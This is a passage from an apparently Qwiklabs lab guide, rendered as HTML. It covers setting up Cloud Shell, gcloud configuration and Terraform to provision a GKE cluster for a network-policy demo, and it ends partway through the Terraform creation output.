0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">lmTNItcHGI0e</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can also find the Password in the Lab Details pane.</span></p></li><li><p><span>Click </span><strong><span>Next</span></strong><span>.</span></p><p><strong><span>Important:</span></strong><span> You must use the credentials the lab provides you. Do not use your Google Cloud account credentials.</span></p><p><strong><span>Note:</span></strong><span> Using your own Google Cloud account for this lab may incur extra charges.</span></p></li><li><p><span>Click through the subsequent pages:</span></p><ul><li><p><span>Accept the terms and conditions.</span></p></li><li><p><span>Do not add recovery options or two-factor authentication (because this is a temporary account).</span></p></li><li><p><span>Do not sign up for free trials.</span></p></li></ul></li></ol><p><span>After a few moments, the Google Cloud console opens in this tab.</span></p><p><strong><span>Note:</span></strong><span> To access Google Cloud products and services, click the </span><strong><span>Navigation menu</span></strong><span> or type the service or product name in the </span><strong><span>Search</span></strong><span> field. </span><img src="images\9Fk8NYFp3quE9mF%2FilWF6%2FlXY9OUBi3UWtb2Ne4uXNU%3D" referrerpolicy="no-referrer" alt="Navigation menu icon and Search field"></p><h4 id='activate-cloud-shell-3'><span>Activate Cloud Shell</span></h4><p><span>Cloud Shell is a virtual machine that is loaded with development tools. It offers a persistent 5GB home directory and runs on the Google Cloud. Cloud Shell provides command-line access to your Google Cloud resources.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Activate Cloud Shell</span></strong><span> </span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span> at the top of the Google Cloud console.</span></p></li><li><p><span>Click through the following windows:</span></p><ul><li><p><span>Continue through the Cloud Shell information window.</span></p></li><li><p><span>Authorize Cloud Shell to use your credentials to make Google Cloud API calls.</span></p></li></ul></li></ol><p><span>When you are connected, you are already authenticated, and the project is set to your </span><strong><span>Project_ID</span></strong><span>, </span><code>qwiklabs-gcp-02-ede9e9aa3015</code><span>. The output contains a line that declares the </span><strong><span>Project_ID</span></strong><span> for this session:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">Your Cloud Platform project in this session is set to qwiklabs-gcp-02-ede9e9aa3015</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><code>gcloud</code><span> is the command-line tool for Google Cloud. It comes pre-installed on Cloud Shell and supports tab-completion.</span></p><ol start='' ><li><p><span>(Optional) You can list the active account name with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud auth list</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACTIVE: *</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">ACCOUNT: student-02-1aeeb3e9ea9b@qwiklabs.net</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">To set the active account, run:</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp;  $ gcloud config set account `ACCOUNT`</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 113px;"></div><div class="CodeMirror-gutters" style="display: none; height: 113px;"></div></div></div></pre><ol start='' ><li><p><span>(Optional) You can list the project ID with this command:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config list project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">[core]</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">project = qwiklabs-gcp-02-ede9e9aa3015</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><strong><span>Note:</span></strong><span> For full documentation of </span><code>gcloud</code><span>, in Google Cloud, refer to </span><a href='https://cloud.google.com/sdk/gcloud'><span>the gcloud CLI overview guide</span></a><span>.</span></p><h4 id='clone-demo'><span>Clone demo</span></h4><ol start='' ><li><p><span>Copy the resources needed for this lab exercise from a Cloud Storage bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp -r gs://spls/gsp480/gke-network-policy-demo .</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Go into the directory for the demo:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cd gke-network-policy-demo</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Make the demo files executable:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">chmod -R 755 *</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='task-1-lab-setup'><span>Task 1. Lab setup</span></h3><p><span>First, set the Google Cloud region and zone.</span></p><ol start='' ><li><p><span>Set the Google Cloud region.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config set compute/region "europe-west1"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Set the Google Cloud zone.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud config set compute/zone "europe-west1-b"</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p></li></ol><p><span>This lab will use the following Google Cloud Service APIs, and have been enabled for you:</span></p><ul><li><p><code>compute.googleapis.com</code></p></li><li><p><code>container.googleapis.com</code></p></li><li><p><code>cloudbuild.googleapis.com</code></p></li></ul><p><span>In addition, the Terraform configuration takes three parameters to determine where the Kubernetes Engine cluster should be created:</span></p><ul><li><p><code>project ID</code></p></li><li><p><code>region</code></p></li><li><p><code>zone</code></p></li></ul><p><span>For simplicity, these parameters are specified in a file named </span><code>terraform.tfvars</code><span>, in the </span><code>terraform</code><span> directory.</span></p><ol start='' ><li><p><span>To ensure the appropriate APIs are enabled and to generate the </span><code>terraform/terraform.tfvars</code><span> file based on your gcloud defaults, run:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">make setup-project</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Type </span><code>y</code><span> when asked to confirm.</span></p></li></ol><p><span>This will enable the necessary Service APIs, and it will also generate a </span><code>terraform/terraform.tfvars</code><span> file with the following keys.</span></p><ol start='' ><li><p><span>Verify the values themselves will match the output of </span><code>gcloud config list</code><span> by running:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">cat terraform/terraform.tfvars</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h3 id='provisioning-the-kubernetes-engine-cluster'><span>Provisioning the Kubernetes Engine cluster</span></h3><ol start='' ><li><p><span>Next, apply the Terraform configuration within the project root:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">make tf-apply</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>When prompted, review the generated plan and enter </span><code>yes</code><span> to deploy the environment.</span></p></li></ol><p><span>This will take several minutes to deploy.</span></p><h3 id='task-2-validation'><span>Task 2. Validation</span></h3><p><span>Terraform outputs a message when the cluster&#39;s been successfully created.</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">...snip...</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">google_container_cluster.primary: Still creating... (3m0s elapsed)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">google_container_cluster.primary: Still creating... (3m10s elapsed)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">google_container_cluster.primary: Still creating... (3m20s elapsed)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">google_container_cluster.primary: Still creating... (3m30s elapsed)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">google_container_cluster.primary: Creation complete after 3m34s (ID: gke-demo-cluster)</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"><span cm-text="" cm-zwsp="">
